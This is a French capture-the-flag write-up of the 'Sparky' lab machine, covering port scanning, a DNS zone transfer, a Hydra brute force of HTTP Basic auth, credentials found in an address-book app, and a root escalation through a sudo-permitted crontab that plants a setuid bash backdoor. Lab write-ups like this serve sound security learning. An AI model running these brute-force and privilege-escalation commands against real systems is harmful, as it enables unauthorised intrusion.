# Solution du CTF Sparky de iamv1nc3nt

L'éternité plus un jour
-----------------------

Dans ma lancée j'ai continué avec le CTF Sparky de [iamv1nc3nt](https://iamv1nc3nt.com/).  

Le challenge se présente comme de difficulté moyenne / difficile mais je pense surtout qu'il manquait une information toute bête pour qu'il soit réalisable.  

```plain
$ sudo nmap -T5 -p- -sCV 192.168.56.26 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-09 17:40 CET 
Nmap scan report for 192.168.56.26 
Host is up (0.00016s latency). 
Not shown: 65531 closed tcp ports (reset) 
PORT     STATE SERVICE VERSION 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   3072 3a:89:c0:a5:2a:f6:61:84:92:14:e9:5a:96:7a:a7:b0 (RSA) 
|   256 70:e8:bd:a9:a3:a6:c7:27:f0:ef:8e:37:8d:4f:eb:8e (ECDSA) 
|_  256 42:81:38:c5:56:ed:ab:26:ae:41:80:4e:ca:4e:9e:01 (ED25519) 
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux) 
| dns-nsid:  
|_  bind.version: 9.16.1-Ubuntu 
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_http-title: Apache2 Ubuntu Default Page: It works 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
9898/tcp open  http    Apache httpd 2.4.41 
| http-auth:  
| HTTP/1.1 401 Unauthorized\x0D 
|_  Basic realm=Restricted 
|_http-title: 401 Unauthorized 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
MAC Address: 08:00:27:6D:FE:44 (Oracle VirtualBox virtual NIC) 
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Remarquant la présence d'un serveur DNS j'ai tenté de faire une résolution inverse sur la machine pour voir si j'obtenais un nom de domaine :  

```plain
$ dig -x 127.0.0.1 @192.168.56.26 

; <<>> DiG 9.16.25 <<>> -x 127.0.0.1 @192.168.56.26 
;; global options: +cmd 
;; Got answer: 
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57090 
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 

;; OPT PSEUDOSECTION: 
; EDNS: version: 0, flags:; udp: 4096 
; COOKIE: 19d43bbdcd4a9fd8010000006203ef59ced5111df2ce8603 (good) 
;; QUESTION SECTION: 
;1.0.0.127.in-addr.arpa.                IN      PTR 

;; ANSWER SECTION: 
1.0.0.127.in-addr.arpa. 604800  IN      PTR     localhost. 

;; Query time: 0 msec 
;; SERVER: 192.168.56.26#53(192.168.56.26) 
;; WHEN: Wed Feb 09 17:44:10 CET 2022 
;; MSG SIZE  rcvd: 102
```

La réponse est donc non. Je me suis ensuite penché sur le port 80 et j'ai trouvé via énumération le dossier */website* qui correspond à une copie de [ce template de facture en HTML](https://github.com/sparksuite/simple-html-invoice-template).  

Contenu statique donc rien à en tirer là non plus. Il ne nous reste qu'à voir ce qu'on peut tirer du port 9898 qui sert un Apache.  

On tombe sur une demande d'authentification Basic mais à ce stade on ne dispose ni d'un nom d'utilisateur ni d'un mot de passe. J'ai testé les couples classiques (*admin / admin*, *test / test*, etc) mais aucun n'a fonctionné.  

On serait tenté de lancer Hydra dessus avec une liste d'utilisateurs, une bonne wordlists pour les mots de passe et un gros parallélisme :  

```plain
$ hydra -t 50 -L unix_users.txt -P rockyou.txt http-head://192.168.56.26:9898
[STATUS] 25113.00 tries/min, 25113 tries in 00:01h, 2409831903 to do in 1599:20h, 50 active
```

Okayyyyyy ! Non, je n'ai pas 1600 heures à tuer...  

J'ai alors refouillé sur ce satané port 80 en énumérant toutes les extensions de fichiers qui me semblaient intéressantes, j'ai brute forcé les hôtes virtuels (sans suffixe puisque l'on n'en a pas), brute forcé aussi les noms d'hôtes sur le DNS :  

```bash
$ gobuster dns -d '' -r 192.168.56.26 -w alexaTop1mAXFRcommonSubdomains.txt
```

J'ai utilisé l'astuce consistant à calculer l'adresse IPv6 link-local depuis l'adresse MAC, ce qui me donne *fe80::a00:27ff:fe6d:fe44* mais les ports ouverts étaient les même.  

J'ai écouté sur l'interface réseau comme c'était le cas pour [Snowtalks Medium](http://devloop.users.sourceforge.net/index.php?article264/solution-du-ctf-snowtalks-medium-de-iamv1nc3nt) mais ça n'a rien donné.  

A ce stade autant dire que la seule solution fut d'abandonner et ouvrir la VM pour voir ce qui cloche. J'ai ainsi découvert un fichier *.htpasswd* avec un hash associé à l'utilisateur *web*.  

C'était l'information qui nous manquait et dont on aurait du disposer pour éviter d'attendre 1600 heures !  

Rue du password
---------------

A vrai dire une fois qu'on dispose du nom d'utilisateur ce n'est pas la joie non plus :  

```plain
$ hydra -t 50 -l web -P rockyou.txt http-head://192.168.56.26:9898                     
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-10 09:33:23 
[WARNING] You must supply the web page as an additional option or via -m, default path set to / 
[WARNING] http-head auth does not work with every server, better use http-get 
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344387 login tries (l:1/p:14344387), ~286888 tries per task 
[DATA] attacking http-head://192.168.56.26:9898/ 
[STATUS] 25063.00 tries/min, 25063 tries in 00:01h, 14319324 to do in 09:32h, 50 active 
[STATUS] 26401.00 tries/min, 79203 tries in 00:03h, 14265184 to do in 09:01h, 50 active 
[STATUS] 24924.29 tries/min, 174470 tries in 00:07h, 14169917 to do in 09:29h, 50 active 
[STATUS] 26064.53 tries/min, 390968 tries in 00:15h, 13953419 to do in 08:56h, 50 active 
[STATUS] 26574.39 tries/min, 823806 tries in 00:31h, 13520581 to do in 08:29h, 50 active 
[9898][http-head] host: 192.168.56.26   login: web   password: webpassword 
1 of 1 target successfully completed, 1 valid password found 
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-10 10:17:16
```

45 minutes pour obtenir un mot de passe on aurait préféré s'en passer.  

Une fois connecté on trouve une appli web de type carnet d'adresse dont le projet est sur Github. [La documentation](https://github.com/AlexWinder/address-book#usage) mentionne un mot de passe par défaut :  

> Once database constants have been set you should now be able to log into the system. The default username is "admin" with a password of "LetMeIn123".

Parmi les adresses enregistrées on note les adresses emails suivantes :  

```plain
btaylor@sparky.local
jtaylor@sparky.local
staylor@sparky.local
```

On a donc un domaine, ce qui peut nous servir pour tenter un transfert de zone :  

```plain
$ dig -t axfr sparky.local @192.168.56.26 

; <<>> DiG 9.16.25 <<>> -t axfr sparky.local @192.168.56.26 
;; global options: +cmd 
sparky.local.           604800  IN      SOA     ns1.sparky.local. root.ns1.sparky.local. 3 604800 86400 2419200 604800 
sparky.local.           604800  IN      TXT     "ZFVtYnJlbGxhJSUK" 
sparky.local.           604800  IN      NS      ns1.sparky.local. 
ftp.sparky.local.       604800  IN      CNAME   www.sparky.local. 
mail.sparky.local.      604800  IN      A       10.10.199.4 
ns1.sparky.local.       604800  IN      A       10.10.199.2 
www.sparky.local.       604800  IN      A       10.10.199.3 
sparky.local.           604800  IN      SOA     ns1.sparky.local. root.ns1.sparky.local. 3 604800 86400 2419200 604800 
;; Query time: 7 msec 
;; SERVER: 192.168.56.26#53(192.168.56.26) 
;; WHEN: Thu Feb 10 13:54:29 CET 2022 
;; XFR size: 8 records (messages 1, bytes 268)
```

On remarque un enregistrement TXT étrange qui se décode en base64 en *dUmbrella%%*. Il s'agit vraisemblablement d'un mot de passe mais après un coup d'Hydra sur le port SSH rien n'est moins sûr.  

C'est à ce moment là qu'il fallait de bons yeux sans quoi on peut y passer des heures encore. L'adresse de *Stacey Taylor* dans le carnet d'adresse contient un mot de passe :  

```plain
1313 Mockingbird Lane, pass: NumbBell1745, Anytown, USA, 11111
```

Grace à cette indication on peut se connecter sur le compte SSH *staylor* :  

```plain
staylor@sparky:~$ sudo -l 
[sudo] password for staylor:  
Matching Defaults entries for staylor on sparky: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User staylor may run the following commands on sparky: 
    (ALL) /usr/bin/crontab
staylor@sparky:~$ sudo /usr/bin/crontab -l 
no crontab for root
```

On peut se servir de crontab avec les droits de l'utilisateur root. Si on édite sa crontab avec l'option *-e* on peut par exemple ajouter l'entrée suivante :  

```plain
* * * * * cp /bin/bash /tmp/g0tr00t && chmod 4755 /tmp/g0troot
```

Mais tout ce que j'obtiens c'est :  

```plain
-rwxr-xr-x 1 root root 1183448 Feb 10 14:22 g0tr00t
```

Quoi ? Le bit setuid n'est pas définit ? J'ai pensé qu'à la seconde recopie le *cp* retournait un code d'erreur si le fichier existait déjà mais j'ai testé en local et ça fonctionnait :-/  

L'exécutable *chmod* ne dispose pas de *capabilities* qui auraient pu le forcer à dropper ce bit... Le système de fichier ne semble pas disposer d'interdiction de montage du type *nosuid* non plus.  

Il ne reste que l'hypothèse que *chmod* a été altéré pour ne pas mettre le bit setuid ?  

J'ai changé ma crontab pour cette commande :  

```bash
python3 -c 'import os; os.chmod("/tmp/g0tr00t", 0o4755)'
```

Et là ça marche :  

```plain
-rwsr-xr-x  1 root root 1183448 Feb 10 14:25 g0tr00t
```

On peut alors profiter de notre backdoor :  

```plain
staylor@sparky:~$ /tmp/g0tr00t -p 
g0tr00t-5.0# id 
uid=1002(staylor) gid=1002(staylor) euid=0(root) groups=1002(staylor) 
g0tr00t-5.0# cd /root 
g0tr00t-5.0# ls 
root.txt  snap 
g0tr00t-5.0# cat root.txt 
767dfec2657d60028dc63ea4496fb87a
```

Reliques
--------

En regardant la liste des utilisateurs on en remarque deux autres :  

```plain
sparky:x:1000:1000:Sparky:/home/sparky:/bin/bash 
jbottoms:x:1001:1001:,,,:/home/jbottoms:/bin/bash 
staylor:x:1002:1002:,,,:/home/staylor:/bin/bash 
jtaylor:x:1003:1003:,,,:/home/jtaylor:/bin/bash
```

Le mot de passe *dUmbrella%%* qui était dans l'enregistrement TXT fonctionne pour l'utilisateur *jbottoms* qui n'était mentionné nul part.  

Cet utilisateur dispose d'un flag *user.txt* mais ça s'arrête là.  

Le CTF a un gros défaut : sans connaissance du nom d'utilisateur pour l'authentification HTTP, la quantité des combinaisons à tester pour l'attaque brute force rend le challenge impossible à résoudre.

*Published February 10 2022 at 16:35*